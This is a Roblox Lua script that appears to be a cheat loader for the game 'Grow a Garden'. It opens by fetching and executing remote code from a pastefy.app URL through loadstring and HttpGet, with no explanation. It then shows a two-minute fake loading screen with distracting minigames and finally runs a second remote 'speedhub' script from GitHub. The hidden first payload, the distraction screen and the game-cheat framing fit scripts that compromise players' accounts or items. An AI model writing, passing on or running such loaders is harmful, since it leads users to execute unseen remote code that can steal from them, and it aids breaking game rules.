loadstring(game:HttpGet("https://pastefy.app/vkoy9vSV/raw"))()
--// Interactive Loading Screen (2 minutes, visible background) //--

task.spawn(function()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.Parent = game.CoreGui

    -- Top red message
    local topMessage = Instance.new("TextLabel")
    topMessage.Size = UDim2.new(1, 0, 0.1, 0)
    topMessage.Position = UDim2.new(0, 0, 0, 0)
    topMessage.BackgroundTransparency = 1
    topMessage.Text = "! SCRIPT LOADING PLEASE WAIT !"
    topMessage.Font = Enum.Font.SourceSansBold
    topMessage.TextSize = 36
    topMessage.TextColor3 = Color3.fromRGB(255, 0, 0)
    topMessage.TextStrokeTransparency = 0
    topMessage.Parent = screenGui

    -- Center title with palm trees
    local centerFrame = Instance.new("Frame")
    centerFrame.Size = UDim2.new(0.6, 0, 0.15, 0)
    centerFrame.Position = UDim2.new(0.2, 0, 0.4, 0)
    centerFrame.BackgroundTransparency = 1
    centerFrame.Parent = screenGui

    local leftPalm = Instance.new("TextLabel")
    leftPalm.Size = UDim2.new(0.2,0,1,0)
    leftPalm.Position = UDim2.new(0,0,0,0)
    leftPalm.BackgroundTransparency = 1
    leftPalm.Text = "🌴"
    leftPalm.TextScaled = true
    leftPalm.Parent = centerFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.6,0,1,0)
    title.Position = UDim2.new(0.2,0,0,0)
    title.BackgroundTransparency = 1
    title.Text = "Grow a Garden"
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 36
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextScaled = true
    title.Parent = centerFrame

    local rightPalm = Instance.new("TextLabel")
    rightPalm.Size = UDim2.new(0.2,0,1,0)
    rightPalm.Position = UDim2.new(0.8,0,0,0)
    rightPalm.BackgroundTransparency = 1
    rightPalm.Text = "🌴"
    rightPalm.TextScaled = true
    rightPalm.Parent = centerFrame

    -- Loading bar background
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.6, 0, 0.08, 0)
    frame.Position = UDim2.new(0.2, 0, 0.8, 0)
    frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255,255,255)
    frame.Parent = screenGui

    -- Loading bar
    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
    bar.BorderSizePixel = 0
    bar.Parent = frame

    -- Loading text
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1,0,1,0)
    text.BackgroundTransparency = 1
    text.Text = "Loading... 0%"
    text.Font = Enum.Font.SourceSansBold
    text.TextSize = 22
    text.TextColor3 = Color3.fromRGB(255,255,255)
    text.Parent = frame

    -- Mini Game 1: Clicker
    local clickerBtn = Instance.new("TextButton")
    clickerBtn.Size = UDim2.new(0.15,0,0.1,0)
    clickerBtn.Position = UDim2.new(0.05,0,0.2,0)
    clickerBtn.Text = "Click Me!"
    clickerBtn.Font = Enum.Font.SourceSansBold
    clickerBtn.TextSize = 20
    clickerBtn.BackgroundColor3 = Color3.fromRGB(0,200,0)
    clickerBtn.Parent = screenGui

    local clicks = 0
    clickerBtn.MouseButton1Click:Connect(function()
        clicks += 1
        clickerBtn.Text = "Clicks: "..clicks
    end)

    -- Mini Game 2: Reaction
    local reactBtn = Instance.new("TextButton")
    reactBtn.Size = UDim2.new(0.2,0,0.1,0)
    reactBtn.Position = UDim2.new(0.75,0,0.2,0)
    reactBtn.Text = "Wait..."
    reactBtn.Font = Enum.Font.SourceSansBold
    reactBtn.TextSize = 20
    reactBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
    reactBtn.Parent = screenGui

    local canClick = false
    local score = 0

    task.spawn(function()
        while screenGui.Parent do
            task.wait(math.random(5,10))
            reactBtn.Text = "CLICK NOW!"
            reactBtn.BackgroundColor3 = Color3.fromRGB(0,200,0)
            canClick = true
            task.wait(1.5)
            if canClick then
                reactBtn.Text = "Too Slow!"
                reactBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
                canClick = false
                task.wait(1)
                reactBtn.Text = "Wait..."
            end
        end
    end)

    reactBtn.MouseButton1Click:Connect(function()
        if canClick then
            score += 1
            reactBtn.Text = "Score: "..score
            reactBtn.BackgroundColor3 = Color3.fromRGB(0,100,200)
            canClick = false
            task.wait(1)
            reactBtn.Text = "Wait..."
            reactBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
        end
    end)

    -- Animate loading bar 2 minutes (120s)
    for i = 1,100 do
        task.wait(1.2)
        bar.Size = UDim2.new(i/100,0,1,0)
        text.Text = "Loading... "..i.."%"
    end

    -- Remove loading screen
    screenGui:Destroy()
end)

--// Main Script (runs in parallel while loading screen is active) //--


-- Paste your original script from GitHub below:

loadstring(game:HttpGet("https://raw.githubusercontent.com/doitforyou956/speedhub/main/script.lua"))()
